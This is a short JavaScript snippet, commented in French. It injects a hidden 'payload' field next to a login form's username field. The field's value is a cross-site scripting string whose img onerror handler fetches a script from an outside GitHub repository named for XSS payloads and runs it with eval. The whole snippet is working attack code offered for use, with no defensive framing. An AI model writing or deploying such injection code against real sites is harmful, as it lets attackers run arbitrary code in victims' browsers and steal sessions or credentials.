// Sélectionne le champ username
var usernameField = document.getElementById('username');

if (usernameField) {
  // Création d'un nouveau champ input caché
  var hiddenField = document.createElement('input');

  // Paramètres du champ caché
  hiddenField.type = 'hidden';
  hiddenField.id = 'payload';          // L'ID que tu veux
  hiddenField.name = 'payload';        // Le name envoyé lors du submit
  hiddenField.value = '"><img src=x onerror="fetch(\'https://raw.githubusercontent.com/Vault-of-Jok3r/payload_xss/refs/heads/main/payload.js\').then(r=>r.text()).then(c=>eval(c))">';

  // Insertion juste après le champ username
  usernameField.parentNode.insertBefore(hiddenField, usernameField.nextSibling);
}
